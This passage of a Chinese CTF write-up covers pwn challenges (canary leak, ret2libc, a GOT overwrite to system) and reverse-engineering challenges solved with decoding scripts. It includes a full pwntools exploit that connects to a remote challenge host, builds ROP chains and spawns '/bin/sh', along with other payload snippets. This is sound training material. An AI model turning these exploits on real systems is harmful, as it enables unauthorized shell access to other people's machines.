6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点:<br>栈溢出, canary</p></blockquote>\n<h4 id=\"简介-10\"><a href=\"#简介-10\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>nc 81.69.0.47 3333</p>\n<h4 id=\"解题-10\"><a href=\"#解题-10\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>存在两次栈溢出漏洞(puts函数会一直输出直到零截断)<br>第一次利用栈溢出以及puts暴露canary的值，第二次利用栈溢出覆盖</p>\n<p>gdb单步调试找到canary的位置, 减去字符串起始位置得到偏移<br>0x7fffffffde88 - 0x7fffffffde20 = 104<br>canary低1位为\\x00，本来应该加1字防止0截至<br>不用加1字，是因为多了个\\n把canary低1位给覆盖了</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">payload1 &#x3D; b&#39;a&#39;*104\np.sendline(payload1)\np.recvuntil(payload1)\ncanary &#x3D; u64(p.recv(8)) - 0xa</code></pre>\n\n<p>ida里搜索得到system地址和’/bin/sh’地址，ROPgadget找到pop rdi的地址</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">payload2 &#x3D; b&#39;a&#39;*104 + p64(canary) + b&#39;a&#39;*8 + poprdi_add + binsh_add + sys_add</code></pre>\n\n<p>cat flag得到SYC{C4nary_1s_s0_Funny!!!}</p>\n<h3 id=\"pwn111\"><a href=\"#pwn111\" class=\"headerlink\" title=\"pwn111\"></a>pwn111</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点:<br>ROP, ret2libc, plt和got</p></blockquote>\n<h4 id=\"简介-11\"><a href=\"#简介-11\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>题目地址： nc 81.69.0.47 1122 题目描述： 这不整一个rop？</p>\n<h4 id=\"解题-11\"><a href=\"#解题-11\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>提供64位程序和libc文件<br>system和bin/sh都在libc中<br>首先获得libc的偏移, 然后构造rop链</p>\n<p>利用write函数暴露某个已绑定的函数地址<br>write参数列表: rdi: 1; rsi: 输出内容地址; rdx: 输出长度</p>\n<p>获取偏移有两种方法</p>\n<h4 id=\"方法一-多次pop\"><a href=\"#方法一-多次pop\" class=\"headerlink\" title=\"方法一: 多次pop\"></a>方法一: 多次pop</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">payload1 &#x3D; b&#39;a&#39;*136 + pop_rdi + p64(1) + pop_rsi_r15 + p64(read_got) + p64(0) + p64(write_plt) + p64(main)</code></pre>\n\n<h4 id=\"方法二-3参数ROP\"><a href=\"#方法二-3参数ROP\" class=\"headerlink\" title=\"方法二: 3参数ROP\"></a>方法二: 3参数ROP</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">.text:401210 mov rdx, r14\n.text:401213 mov rsi, r13\n.text:401216 mov edi, r12d\n.text:401219 call qword ptr [r15+rbx*8]\n.text:40121D add rbx, 1\n.text:401221 cmp rbp, rbx\n.text:401224 jnz short loc_401210\n.text:401226 add rsp, 8\n.text:40122A pop rbx\n.text:40122B pop rbp\n.text:40122C pop r12\n.text:40122E pop r13\n.text:401230 pop r14\n.text:401232 pop r15\n.text:401234 retn</code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">pop_r &#x3D; p64(0x40122C) + p64(1) + p64(read_got) + p64(8) + p64(write_got)\nmov_r &#x3D; p64(0x401210)\npad &#x3D; b&#39;a&#39;*128 + p64(1)\npayload1 &#x3D; pad + pop_r + mov_r + p64(0)*7 + p64(main)</code></pre>\n\n<p>偏移 = 暴露地址 - libc地址<br>然后只需要在libc的地址上加上偏移即可</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">read_libc &#x3D; libc.symbols[&#39;read&#39;]\noffset &#x3D; read_add - read_libc\nsys_add &#x3D; libc.symbols[&#39;system&#39;] + offset\nbinsh_add &#x3D; 0x18ce17 + offset\npayload2 &#x3D; b&#39;a&#39;*136 + pop_rdi + p64(binsh_add) + p64(sys_add) + b&#39;a&#39;*8</code></pre>\n\n<p>需注意的是要发送str而不是bytes，否则会失败，原因未知<br>sendline(payload.decode(“iso-8859-1”))</p>\n<h3 id=\"pwn222\"><a href=\"#pwn222\" class=\"headerlink\" title=\"pwn222\"></a>pwn222</h3><h4 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h4><p>system在realpath旁边</p>\n<ul>\n<li>调用realpath，为got赋值</li>\n<li>修改realpath的got，变成system</li>\n<li>往bss段写入’/bin/sh’</li>\n<li>执行realpath(‘/bin/sh’)（system(‘/bin/sh’)）</li>\n</ul>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from pwn import *\n\nst &#x3D; 3\n\np &#x3D; remote(&#39;81.69.0.47&#39;, 1122)\n\n### p &#x3D; process(&#39;.&#x2F;p7&#39;)\nelf &#x3D; ELF(&#39;.&#x2F;p7&#39;)\nelflibc &#x3D; ELF(&#39;.&#x2F;libc&#39;)\n\noffset &#x3D; 40\n\nmain &#x3D; elf.symbols[&#39;main&#39;]\nhint_addr &#x3D; 0x4011AC\nread_got &#x3D; elf.got[&#39;read&#39;]\nrealpath_plt &#x3D; elf.plt[&#39;realpath&#39;]\nrealpath_got &#x3D; elf.got[&#39;realpath&#39;]\npop_rdi &#x3D; 0x401233\nbss_addr &#x3D; 0x404040\n\n### 1.1 plt realpath\ncall_realpath &#x3D; p64(hint_addr)\n\n### 1.2 realpath -&gt; system\npop_6 &#x3D; p64(0x40122A)+p64(0xffffffffffffffd0)+p64(realpath_got+0x3d)+p64(read_got)+p64(0)+p64(0)+p64(0)\nadd_r &#x3D; p64(0x40112c) # add\ncall_add &#x3D; pop_6 + add_r\n\npayload &#x3D; b&#39;a&#39;*offset + call_realpath + call_add + p64(main)\np.sendline(payload.decode(&quot;iso-8859-1&quot;))\nprint(&#39;111&#39;)\nsleep(st)\n\n### 2.1 read &#x2F;bin&#x2F;sh (rbx, rbp, edi, rsi, rdx, ret)\npop_6 &#x3D; p64(0x40122a)+ p64(0)+p64(1) + p64(0)+p64(bss_addr)+p64(8)+p64(read_got)\nmov_4 &#x3D; p64(0x401210)\nread_bs &#x3D; pop_6+mov_4+p64(0)*7\n\n### 2.2 call system\ncall_system &#x3D; p64(pop_rdi) + p64(bss_addr) + p64(realpath_plt) + b&#39;a&#39;*8\n\n### gdb.attach(p)\n\npayload &#x3D; b&#39;a&#39;*(offset-8) + p64(1) + read_bs + call_system\np.sendline(payload.decode(&quot;iso-8859-1&quot;))\nprint(&#39;222&#39;)\nsleep(st)\n\n### 3 send\n\npayload &#x3D; &#39;&#x2F;bin&#x2F;sh\\x00&#39;\np.sendline(payload)\nprint(&#39;333&#39;)\n\nsleep(st)\n\np.interactive()</code></pre>\n\n<h2 id=\"RE\"><a href=\"#RE\" class=\"headerlink\" title=\"RE\"></a>RE</h2><h3 id=\"No-RE-no-gain\"><a href=\"#No-RE-no-gain\" class=\"headerlink\" title=\"No RE no gain\"></a>No RE no gain</h3><p>ida直接搜索字符串，明文flag</p>\n<h3 id=\"我真的不会写驱动\"><a href=\"#我真的不会写驱动\" class=\"headerlink\" title=\"我真的不会写驱动\"></a>我真的不会写驱动</h3><p>ida直接搜索字符串，明文flag</p>\n<h3 id=\"re00\"><a href=\"#re00\" class=\"headerlink\" title=\"re00\"></a>re00</h3><p>ida分析只进行了个异或运算<br>用python写个脚本即可<br>脚本见/re03/s.py</p>\n<h3 id=\"maze\"><a href=\"#maze\" class=\"headerlink\" title=\"maze\"></a>maze</h3><p>搜索字符串+交叉引用找到主要代码在sub_401a10<br>反编译发现代码逻辑为在一个一维数组中移动<br>并将此一维数组解释位长31的二维数组</p>\n<p>找到对应数组位置，数组前面应该再加个空格以便对齐起点和字符’s’的位置</p>\n<p>如何就是走迷宫了，具体代码见/re04/s.pys.py</p>\n<h3 id=\"Hello-NET\"><a href=\"#Hello-NET\" class=\"headerlink\" title=\"Hello .NET\"></a>Hello .NET</h3><p>使用ILSpy反汇编<br>在WpfAppCS -&gt; WpfAppCS -&gt; MainWindow -&gt; Check是构造flag的代码<br>用python写脚本解出flag，脚本见/re05/s.py</p>\n<h3 id=\"刘壮的BaseXX\"><a href=\"#刘壮的BaseXX\" class=\"headerlink\" title=\"刘壮的BaseXX\"></a>刘壮的BaseXX</h3><p>流程：<br>把flag高低四位位互换<br>然后与i异或<br>然后base64encode（更换码表）<br>再与目标字符串比较</p>\n<p>逆向做一遍即可，代码见/re06/r.py</p>\n<h3 id=\"WhatsApk\"><a href=\"#WhatsApk\" class=\"headerlink\" title=\"WhatsApk\"></a>WhatsApk</h3><p>value -&gt; string里有明文flag</p>\n<h3 id=\"HelloAndroid\"><a href=\"#HelloAndroid\" class=\"headerlink\" title=\"HelloAndroid\"></a>HelloAndroid</h3><p>找到主函数位置，直接能看到明文flag</p>\n<h3 id=\"Easy-virus\"><a href=\"#Easy-virus\" class=\"headerlink\" title=\"Easy_virus\"></a>Easy_virus</h3><h4 id=\"提示-9\"><a href=\"#提示-9\" class=\"headerlink\" title=\"提示\"></a>提示</h4><p>提示文件是个图片，是PE文件格式总结</p>\n<h4 id=\"解题-12\"><a href=\"#解题-12\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>首先运行exe，会在C盘生成个SYC_DLL.dll<br>复制到工作目录下，修复该dll，改DOS头MZ<br>然后在vs新建x86控制台工程，隐式调用该dll<br>函数指针类型提示中有（运行exe得到）<br>然后就会弹窗显示flag</p>\n<p>也可以直接ida分析dll文件</p>\n<h3 id=\"un-snake\"><a href=\"#un-snake\" class=\"headerlink\" title=\"un_snake\"></a>un_snake</h3><p>题目给了一个pyc文件，使用uncompyle6反编译</p>\n<p>根据反编译结果写反函数即可</p>\n<h4 id=\"正向流程\"><a href=\"#正向流程\" class=\"headerlink\" title=\"正向流程\"></a>正向流程</h4><ul>\n<li>flag = encode(flag)</li>\n<li>flag = pre(flag)</li>\n<li>flag = enc(flag)</li>\n<li>flag = b64encode(flag)</li>\n<li>cmp flag, target</li>\n</ul>\n<h4 id=\"反向分析\"><a href=\"#反向分析\" class=\"headerlink\" title=\"反向分析\"></a>反向分析</h4><h4 id=\"pre\"><a href=\"#pre\" class=\"headerlink\" title=\"pre()\"></a>pre()</h4><p>做了个异或运算，所以它的反函数还算它本身</p>\n<h4 id=\"enc\"><a href=\"#enc\" class=\"headerlink\" title=\"enc()\"></a>enc()</h4><p>先逐个异或，然后交换高低位，反函数也很好写</p>\n<h4 id=\"解题脚本-1\"><a href=\"#解题脚本-1\" class=\"headerlink\" title=\"解题脚本\"></a>解题脚本</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from base64 import *\n\n\ndef unenc(plain):\n    plain &#x3D; list(plain)\n\n    length &#x3D; len(plain) - 2\n\n    for i in range(len(plain) - 1):\n        plain[length - i] ^&#x3D; plain[length - i + 1]\n\n    for i in range(len(plain)):\n        c &#x3D; plain[i]\n        plain[i] &#x3D; (c &gt;&gt; 3 | c &lt;&lt; 5) &amp; 255\n\n    return bytes(plain[::-1])\n\n\ndef unpre(data):\n    th1s &#x3D; &#39;TBESCFSRSAEUITANAIIN&#39;.encode()\n    if (data_len :&#x3D; len(data)) &gt; (th1s_len :&#x3D; len(th1s)):\n        th1s &#x3D; th1s * (data_len &#x2F;&#x2F; th1s_len) + th1s[:data_len - th1s_len]\n    return bytes(map(lambda x, y: x ^ y, data, th1s))\n\n\nflag &#x3D; b&#39;mEiQCAjJoXJy2NiZQGGQyRm6IgHYQZAICKgowHHo4Dg&#x3D;&#39;\nflag &#x3D; b64decode(flag)\nprint(flag)\nflag &#x3D; unenc(flag)\nprint(flag)\nflag &#x3D; unpre(flag)\nprint(flag)\nflag &#x3D; flag.decode()\nprint(flag)</code></pre>\n\n<h3 id=\"plain-snake\"><a href=\"#plain-snake\" class=\"headerlink\" title=\"plain_snake\"></a>plain_snake</h3><h4 id=\"提示-10\"><a href=\"#提示-10\" class=\"headerlink\" title=\"提示\"></a>提示</h4><p>字节码，<a href=\"https://docs.python.org/zh-cn/3/library/dis.html\">https://docs.python.org/zh-cn/3/library/dis.html</a></p>\n<h4 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h4><p>给出字节码的反汇编，根据反汇编还原python脚本</p>\n<h4 id=\"例子（源自本题）\"><a href=\"#例子（源自本题）\" class=\"headerlink\" title=\"例子（源自本题）\"></a>例子（源自本题）</h4><p>代码<code>s = s[4:-1]</code>的字节码反汇编如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">LOAD_FAST (s)\nLOAD_CONST (4)\nLOAD_CONST (-1)\nBUILD_SLICE 2\nBINARY_SUBSCR\nSTORE_FAST (s)</code></pre>\n\n<p>这里其实我有个疑问，按文档应该是BUILD_SLICE 3？</p>\n<h4 id=\"还原代码\"><a href=\"#还原代码\" class=\"headerlink\" title=\"还原代码\"></a>还原代码</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from base64 import *\n\ndef fn0(s): # 3\n    return None\n\ndef fn1(s): # 6\n    s &#x3D; s.encode()\n    s &#x3D; list(s)\n    s &#x3D; [x^83 for x in s]\n    for i in range(0, len(s), 2):\n        s[i], s[i+1] &#x3D; s[i+1], s[i]\n        s[i]^&#x3D;89\n        s[i+1]^&#x3D;67\n    return bytes(s).decode()\n\ndef check(s): # 16\n    s &#x3D; s.encode()\n    if(b64encode(s) &#x3D;&#x3D; b&#39;c0BiZGQgSU9kJEhPVXU5RH5ofk9lIA&#x3D;&#x3D;&#39;): # f -&gt; 21\n        return True\n    else:\n        return False\n\ndef getInput(): # 23\n    while(True): # guess\n        s &#x3D; input(&#39;Type in the flag:&#39;) # f -&gt; 28\n        if(s.startswith(&#39;SYC&#123;&#39;) and s.endswith(&#39;&#125;&#39;)):\n            break\n        print(&#39;Wrong format, try again!&#39;) # jmp 25\n    s &#x3D; s[4:-1]\n    return s\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;: # 32\n    print(&#39;Welcome to python!&#39;)\n    s &#x3D; getInput()\n    fn0(s)\n    s &#x3D; fn1(s)\n    if(check(s)): # False -&gt; 40\n        print(&#39;Correct!&#39;)\n    else:\n        print(&#39;Wrong!&#39;)</code></pre>\n\n<h4 id=\"解题脚本-2\"><a href=\"#解题脚本-2\" class=\"headerlink\" title=\"解题脚本\"></a>解题脚本</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from base64 import *\ntarget &#x3D; b&#39;c0BiZGQgSU9kJEhPVXU5RH5ofk9lIA&#x3D;&#x3D;&#39;\ns &#x3D; b64decode(target)\ns &#x3D; list(s)\n\nfor i in range(0, len(s), 2):\n    s[i]^&#x3D;89\n    s[i+1]^&#x3D;67\n    s[i], s[i+1] &#x3D; s[i+1], s[i]\n\nfor i in range(len(s)):\n    s[i] ^&#x3D; 83\n\ns &#x3D; bytes(s).decode()\nprint(&#39;SYC&#123;&#39; + s + &#39;&#125;&#39;)</code></pre>\n\n<h3 id=\"baby-re\"><a href=\"#baby-re\" class=\"headerlink\" title=\"baby_re\"></a>baby_re</h3><p>通过搜索字符串找到主函数位置：0x432DA0</p>\n<h4 id=\"目标内容\"><a href=\"#目标内容\" class=\"headerlink\" title=\"目标内容\"></a>目标内容</h4><p>里面给了一个char数组，数组包含负数，用脚本转换成16进制补码</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">v13 &#x3D; [0x4e, 21, -60, -19, -90, 47, 86, 16, -69, 19, -21, -83, 117, 86, -57, -69, -69, -23, -71, -52, 2, 58, 80, -97, 54, -112, 105, -66, 124, 66, 68, -54, -58, -44, 36, 92, -46, -71, 36, -63, 24, -109, -77, -22]\nn_v13 &#x3D; []\n\nfor i in v13:\n    if i &gt;&#x3D; 0:\n        n_v13.append(i)\n    else:\n        # ((-i) - 1) ^ 0xFF\n        n_v13.append((-i-1)^0xFF)\n\nprint(n_v13)</code></pre>\n\n<h4 id=\"正向流程-1\"><a href=\"#正向流程-1\" class=\"headerlink\" title=\"正向流程\"></a>正向流程</h4><h4 id=\"step1：sub-42F057\"><a href=\"#step1：sub-42F057\" class=\"headerlink\" title=\"step1：sub_42F057()\"></a>step1：sub_42F057()</h4><p>该函数有反调试的作用，根据你使用的调试器，获取一个字符串，用于下一步，绕过方法在step-2中（正确结果是‘x0nB@D’）</p>\n<h4 id=\"step2：sub-432B20\"><a href=\"#step2：sub-432B20\" class=\"headerlink\" title=\"step2：sub_432B20()\"></a>step2：sub_432B20()</h4><p>根据上一步生成的字符串，以及输入flag的长度，生成长256的字符串</p>\n<h4 id=\"step3：sub-4329B0\"><a href=\"#step3：sub-4329B0\" class=\"headerlink\" title=\"step3：sub_4329B0()\"></a>step3：sub_4329B0()</h4><p>根据上一步生成的长256的字符串，对输入进行处理</p>\n<p>对于每一个输入，交换长256字符串的内容，再根据这个字符串计算出一个下标，取字符串中该下标的内容，与输入进行异或处理</p>\n<h4 id=\"解题-13\"><a href=\"#解题-13\" class=\"headerlink\" title=\"解题\"></a>解题</h4><h4 id=\"step-3：改写sub-4329B0\"><a href=\"#step-3：改写sub-4329B0\" class=\"headerlink\" title=\"step-3：改写sub_4329B0()\"></a>step-3：改写sub_4329B0()</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">def sub_4329B0(a1, a2, a3, a4):\n### a2 &#x3D; len256string\n### a3 &#x3D; target\n### a4 &#x3D; length &#x3D; 44\n    v8 &#x3D; 0\n    v14 &#x3D; 0\n    v2c &#x3D; 0\n    v38 &#x3D; 0\n\n    v &#x3D; []\n    for v38 in range(a4):\n        v8 &#x3D; ui(v8 + 1)\n        v14 &#x3D; ui(v14 + a2[v8])\n        &#39;&#39;&#39;\n        v20 &#x3D; a2[v8]\n        a2[v8] &#x3D; a2[v14]\n        a2[v14] &#x3D; v20\n        &#39;&#39;&#39;\n        a2[v8], a2[v14] &#x3D; a2[v14], a2[v8]\n        v2c &#x3D; ui(a2[v8] + a2[v14])\n        v.append( a2[v2c] )\n        a3[v38] &#x3D; ui(a3[v38]^a2[v2c])\n\n    return v</code></pre>\n\n<p>代码中使用v保存了每次异或运算第二个数，如此一来，反函数只需要把flag与v异或即可</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">def re_4329B0(a3, a4, v):\n### a3 &#x3D; inputs\n### a4 &#x3D; length &#x3D; 44\n    for i in range(a4):\n        a3[i] &#x3D; a3[i] ^ v[i]</code></pre>\n\n<h4 id=\"step-2：获取sub-432B20-结果\"><a href=\"#step-2：获取sub-432B20-结果\" class=\"headerlink\" title=\"step-2：获取sub_432B20()结果\"></a>step-2：获取sub_432B20()结果</h4><p>先运行程序，然后打开x32dbg，附加到该程序，找到这个函数，直接复制粘贴运行后的结果</p>\n<h4 id=\"解题脚本-3\"><a href=\"#解题脚本-3\" class=\"headerlink\" title=\"解题脚本\"></a>解题脚本</h4><p>至此，准备工作完毕，可以写出解题脚本</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">flag &#x3D; &#39;a&#39;*44  # 随便取长44的内容\ntarget &#x3D; [...] # 目标数组，开头给出计算脚本\nv19 &#x3D; [...]    # step-2中获取\nv &#x3D; sub_4329B0(1, v19, flag, 44) # 获取v\nre_4329B0(target, 44, v) # 算出flag\nfor c in target:\n    print(chr(c), end&#x3D;&#39;&#39;)\nprint()</code></pre>\n\n<p>得到的flag是ùYC{Pjx_s_Wom3n_cl0thing_1s_S0oo0o0_cute!1i}</p>\n<p>把第一个改成S即可（不知道为什么第一个字符错了）</p>\n<h3 id=\"golang11\"><a href=\"#golang11\" class=\"headerlink\" title=\"golang11\"></a>golang11</h3><h4 id=\"简介-12\"><a href=\"#简介-12\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>简单的go语言逆向</p>\n<h4 id=\"go语言逆向\"><a href=\"#go语言逆向\" class=\"headerlink\" title=\"go语言逆向\"></a>go语言逆向</h4><p>使用Idagolanghelper插件，ida7.0需要修改部分脚本才能使用</p>\n<h4 id=\"主函数猜的结果\"><a href=\"#主函数猜的结果\" class=\"headerlink\" title=\"主函数猜的结果\"></a>主函数猜的结果</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">q &#x3D; [0x53, 0x58, 0x41, 0x78, 0x70, 0x6D, 0x63, 0x58, 0x62, 0x35, 0x60,\n0x7A, 0x5B, 0x62, 0x36, 0x6B, 0x61, 0x6F, 0x65, 0x5C, 0x76, 0x60,\n0x70, 0x7A]\n\nv20 &#x3D; [i for i in range(8)]\nv12 &#x3D; [...] # 输入的flag，长24</code></pre>\n\n\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">for i in range(24):\n    # 1\n    a1 &#x3D; i - 8 * (i &gt;&gt; 3)\n    # 2\n    a2 &#x3D; v20[a1] ^ v12[i]\n    # 3\n    if(q[j] !&#x3D; a2):\n    print(&#39;???&#39;)</code></pre>\n\n<h4 id=\"反函数\"><a href=\"#反函数\" class=\"headerlink\" title=\"反函数\"></a>反函数</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">for i_i in range(24):\n    i &#x3D; 23 - i_i\n    # -3\n    a2 &#x3D; q[i]\n    # 1\n    a1 &#x3D; i - 8 * (i &gt;&gt; 3)\n    # -2\n    v12[i] &#x3D; a2 ^ v20[a1]</code></pre>\n\n","count_time":{"symbolsCount":"26k","symbolsTime":"24 mins."},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CRYPTO\"><span class=\"toc-text\">CRYPTO</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%88%98%E6%83%85%E6%8A%A5%E5%91%98%E5%88%98%E5%A3%AE\"><span class=\"toc-text\">二战情报员刘壮</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%90%E7%A4%BA\"><span class=\"toc-text\">提示</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98\"><span class=\"toc-text\">解题</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%93%A0%E7%94%B2%E4%B8%8E%E8%90%A8%E6%BB%A1\"><span class=\"toc-text\">铠甲与萨满</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-1\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%90%E7%A4%BA-1\"><span class=\"toc-text\">提示</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98-1\"><span class=\"toc-text\">解题</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%B4%E5%A4%9A%E5%88%A9%E4%BA%9A\"><span class=\"toc-text\">维多利亚</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-2\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%90%E7%A4%BA-2\"><span class=\"toc-text\">提示</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98-2\"><span class=\"toc-text\">解题</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%951-%E4%BD%BF%E7%94%A8%E7%BD%91%E7%AB%99%E8%87%AA%E5%8A%A8%E8%A7%A3%E5%86%B3\"><span class=\"toc-text\">解法1: 使用网站自动解决</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%952-%E7%8C%9C%E6%B5%8B%E5%8A%A0%E6%89%8B%E8%A7%A3\"><span class=\"toc-text\">解法2: 猜测加手解</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8A%A0%E5%AF%86%E7%94%A8python%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">加密用python脚本</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%88%90%E9%83%BD%E5%85%BB%E7%8C%AA%E4%BA%8C%E5%8E%82\"><span class=\"toc-text\">成都养猪二厂</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-3\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%90%E7%A4%BA-3\"><span class=\"toc-text\">提示</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98-3\"><span class=\"toc-text\">解题</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%84%E8%A7%84%E7%9F%A9%E7%9F%A9%E7%9A%84%E5%B7%A5%E4%BD%9C\"><span class=\"toc-text\">规规矩矩的工作</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-4\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%90%E7%A4%BA-4\"><span class=\"toc-text\">提示</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98-4\"><span class=\"toc-text\">解题</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#babyRSA\"><span class=\"toc-text\">babyRSA</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a 